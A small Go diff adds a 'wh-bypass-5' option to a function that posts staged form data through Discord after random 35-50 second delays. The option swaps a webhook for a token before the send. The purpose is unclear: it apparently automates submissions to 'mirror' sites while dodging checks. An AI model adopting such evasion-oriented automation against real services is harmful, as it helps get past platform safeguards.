@@ -59,6 +59,14 @@ func attempt(mirror string) {
 	common.RandDelayRange(35*time.Second, 50*time.Second)
 
 	// (step 5) POST back2 (from load --> dinamica2)
+	back_hook = ""
+	if m.HasOption("wh-bypass-5") && m.Token != "" {
+		back_hook = m.Webhook
+		m.Webhook = m.Token
+	}
 	m.SendDiscord(&h, d.DataForStep(5))
+	if back_hook != "" {
+		m.Webhook = back_hook
+	}
 	common.RandDelayRange(35*time.Second, 50*time.Second)
 }
